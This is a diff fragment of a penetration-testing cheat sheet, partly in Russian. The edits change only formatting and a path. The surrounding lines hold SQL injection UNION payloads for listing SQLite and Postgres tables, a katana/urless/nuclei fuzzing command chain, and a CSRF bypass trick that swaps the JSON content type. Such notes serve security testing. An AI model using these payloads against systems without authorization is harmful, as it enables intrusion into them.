@@ -169,7 +169,7 @@ get tables:
 ```sql
 union select null,tbl_name FROM sqlite_master
 ```
-## postgres
+### postgres
 list of tables in the database:
 ```sql
 UNION SELECT table_name, NULL FROM information_schema.tables--
@@ -476,7 +476,7 @@ Takeaways: Don't hit a dead end with GraphQL apps. Dive deeper, find those conce
 ```sh
 katana -u http://domain.com -silent -d 15 -rl 500 -jc -c 20 -kf all -ct 2m -sf qurl -o urls.txt
 urless -i urls.txt -o output.txt
-nuclei -l output.txt -t fuzzing-templates/ -silent
+nuclei -l output.txt -t /opt/fuzzing-templates/ -silent
 ```
 # csrf json
 Во время проекта наткнулся на функциональность изменения профиля. Ну и, понятное дело, не проверить CSRF было бы грехом. Однако, общение с бэкендом происходит через Rest с использованием `Content-type: application/json`. Вместо `application/json` ставим `application/x-www-form-urlencoded`, а тело запроса оставляем прежним :).  
